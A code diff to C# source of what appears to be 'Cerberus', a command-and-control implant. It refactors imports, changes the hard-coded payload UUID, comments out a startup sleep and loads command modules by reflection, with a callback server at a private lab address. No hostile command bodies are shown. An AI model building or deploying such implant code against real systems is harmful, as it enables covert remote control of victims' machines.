@@ -1,5 +1,8 @@
-﻿using Cerberus.Models.CommModule;
-using Cerberus.Models.Tasks;
+﻿using CommModuleBase;
+using HttpModule;
+using Models.Tasks;
+using Tasks.Commands;
+
 using System;
 using System.Collections.Generic;
 using System.Diagnostics;
@@ -24,7 +27,7 @@ namespace Cerberus
 
         private static string serverAddress = "10.0.2.128";
         private static int serverPort = 80;
-        private static string PayloadUUID = "36ca94cf-5d46-4ae9-8770-6e1e93a3ae79";
+        private static string PayloadUUID = "e43e4a5a-7c15-4612-9fbb-2b2821cc644a";
         private static string UUID = "";
         private string killdate = "";
 
@@ -38,7 +41,7 @@ namespace Cerberus
 
         static void Main(string[] args)
         {
-            Thread.Sleep(5000);
+            //Thread.Sleep(5000);
 
             GenerateMetadata();
             LoadCerberusCommands();
@@ -123,9 +126,9 @@ namespace Cerberus
 
         private static void LoadCerberusCommands()
         {
-            var self = Assembly.GetExecutingAssembly();
+            var tasks = Assembly.Load("Tasks");
 
-            foreach(var type in self.GetTypes())
+            foreach(var type in tasks.GetTypes())
             {
                 if (type.IsSubclassOf(typeof(CerberusCommand)))
                 {
